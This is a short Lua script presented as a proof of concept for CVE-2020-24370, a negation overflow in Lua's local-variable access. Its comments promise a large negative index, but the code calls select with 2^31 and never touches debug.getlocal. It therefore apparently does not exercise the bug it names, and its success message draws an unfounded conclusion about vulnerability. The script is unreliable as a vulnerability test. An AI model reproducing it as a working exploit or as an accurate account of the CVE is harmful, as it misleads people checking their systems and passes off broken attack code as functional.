function vulnerable_function(...)
    -- Attempt to access a local variable with a large negative index,
    -- aiming to trigger the negation overflow described in CVE-2020-24370
    local status, err = pcall(function() return select(2^31, ...) end)
    if not status then
        print("Error encountered: ", err)
    else
        print("Accessed variable: ", err) -- In a non-vulnerable environment, this shouldn't be reached
    end
end

-- Call the vulnerable function with dummy arguments
vulnerable_function(1, 2, 3)
